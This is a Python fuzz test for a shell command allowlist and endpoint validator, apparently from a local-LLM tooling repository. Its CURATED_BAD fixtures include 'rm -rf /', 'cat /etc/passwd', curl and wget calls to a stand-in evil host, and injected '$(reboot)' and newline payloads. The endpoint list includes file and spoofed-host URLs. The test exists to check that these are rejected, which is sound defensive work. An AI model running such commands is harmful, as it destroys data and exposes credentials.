#!/usr/bin/env python3
"""Property-based fuzzing for the command allowlist and endpoint validator.

Invariants:
  * a command is accepted only if it contains no shell metacharacter.
  * an endpoint is accepted only if its scheme is http/https and the host rules
    hold (localhost, or remote https when SHUNT_ALLOW_REMOTE=true).
"""
import base64
import os
import random
import subprocess
import sys
import tempfile

REPO = sys.argv[1]
LIB = os.path.join(REPO, "scripts", "lib", "local-llm.sh")
random.seed(1337)

DANGEROUS = set(";|&<>`$(){}[]*?~!\"'\t\r\n")
ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789._/:=@+- ;|&<>`$(){}[]*?~!\\\"'\t"

CURATED_BAD = [
    "echo pwned > /tmp/x",
    "cat /etc/passwd",
    "curl http://evil.example",
    "rm -rf /",
    "bash -c rm",
    "python3 -c pass",
    "true; rm -rf /",
    "true | sh",
    "$(reboot)",
    "touch${IFS}x",
    "echo $HOME",
    "node -e require",
    "cmd\nrm -rf /",
    "wget http://evil",
    "chmod 777 x",
]
CURATED_OK = [
    "npm test -- tests/a.test.ts",
    "python3 -B test.py",
    "go test ./...",
    "pytest -q",
    "make test",
    "cargo test --all-features",
    "./gradlew test",
]


def bash_validate(snippet, inputs, env=None):
    # Base64-encode each payload so newlines/tabs survive the line-oriented
    # protocol; force UTF-8 so Windows does not decode the output as UTF-16.
    encoded = [base64.b64encode(x.encode()).decode() for x in inputs]
    script = (
        f'. "{LIB}" >/dev/null 2>&1; '
        "while IFS= read -r b64; do "
        'line=$(printf %s "$b64" | base64 -d); '
        f'if {snippet} >/dev/null 2>&1; then printf "A\\n"; else printf "R\\n"; fi; '
        "done"
    )
    proc = subprocess.run(
        ["bash", "-c", script],
        input="\n".join(encoded) + "\n",
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env={**os.environ, "HOME": tempfile.mkdtemp(), **(env or {})},
    )
    return [tok for tok in proc.stdout.replace("\r", "").split("\n") if tok]


def main():
    passed = 0
    failed = 0

    # --- command allowlist ---
    random_cmds = []
    for _ in range(400):
        n = random.randint(1, 40)
        random_cmds.append("".join(random.choice(ALPHABET) for _ in range(n)))
    cmds = CURATED_BAD + CURATED_OK + random_cmds
    results = bash_validate('shunt_validate_exec_command "$line" fuzz', cmds)
    if len(results) != len(cmds):
        print(f"  FAIL fuzz-run expected {len(cmds)} results, got {len(results)}")
        failed += 1
        results = results + ["R"] * (len(cmds) - len(results))

    violations = 0
    for cmd, res in zip(cmds, results):
        if res == "A" and any(c in DANGEROUS for c in cmd):
            violations += 1
    if violations == 0:
        print("  PASS fuzz-property accepted commands never contain metacharacters")
        passed += 1
    else:
        print(f"  FAIL fuzz-property {violations} accepted payloads contained metacharacters")
        failed += 1

    cur_bad = results[: len(CURATED_BAD)]
    if all(r == "R" for r in cur_bad):
        print(f"  PASS fuzz-curated-bad all {len(CURATED_BAD)} attacks rejected")
        passed += 1
    else:
        print(f"  FAIL fuzz-curated-bad unexpected accept in {CURATED_BAD}")
        failed += 1

    cur_ok = results[len(CURATED_BAD): len(CURATED_BAD) + len(CURATED_OK)]
    if all(r == "A" for r in cur_ok):
        print(f"  PASS fuzz-curated-ok all {len(CURATED_OK)} test runners accepted")
        passed += 1
    else:
        print(f"  FAIL fuzz-curated-ok a legitimate command was rejected: {list(zip(CURATED_OK, cur_ok))}")
        failed += 1

    # --- endpoint validator ---
    endpoints = [
        "http://127.0.0.1:8080/v1/chat/completions",
        "http://localhost:11434/v1/chat/completions",
        "https://evil.example/v1",
        "http://evil.example/v1",
        "gopher://evil.example/x",
        "file:///etc/passwd",
        "ftp://evil.example/x",
        "http://user@127.0.0.1:8080/v1",
        "http://github.com.evil.example/v1",
        "HTTPS://remote.example/v1",
    ]
    res_default = bash_validate('shunt_validate_endpoint "$line"', endpoints)
    res_remote = bash_validate(
        'shunt_validate_endpoint "$line"', endpoints, env={"SHUNT_ALLOW_REMOTE": "true"}
    )

    checks = {
        "localhost-http": res_default[0] == "A",
        "localhost-http-alt": res_default[1] == "A",
        "remote-https-blocked-by-default": res_default[2] == "R",
        "remote-http-blocked": res_default[3] == "R",
        "gopher-blocked": res_default[4] == "R",
        "file-blocked": res_default[5] == "R",
        "ftp-blocked": res_default[6] == "R",
        "userinfo-blocked": res_default[7] == "R",
        "suffix-spoof-blocked": res_default[8] == "R",
        "remote-https-optin": res_remote[2] == "A",
        "remote-http-optin-blocked": res_remote[3] == "R",
        "gopher-optin-blocked": res_remote[4] == "R",
    }
    for name, ok in checks.items():
        if ok:
            print(f"  PASS endpoint-{name}")
            passed += 1
        else:
            print(f"  FAIL endpoint-{name}")
            failed += 1

    print("")
    print(f"## {passed} {failed}")
    print(f"Results: {passed} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
